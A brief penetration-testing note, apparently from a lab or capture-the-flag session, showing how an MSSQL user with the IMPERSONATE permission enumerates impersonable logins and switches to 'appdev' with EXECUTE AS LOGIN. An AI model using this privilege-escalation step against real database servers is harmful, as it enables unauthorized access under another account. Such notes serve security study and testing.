if you have impersonate priv in MSSQL, you can run commands as the context of that user.
```
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```

impersonation
```
EXECUTE AS LOGIN = 'appdev';
```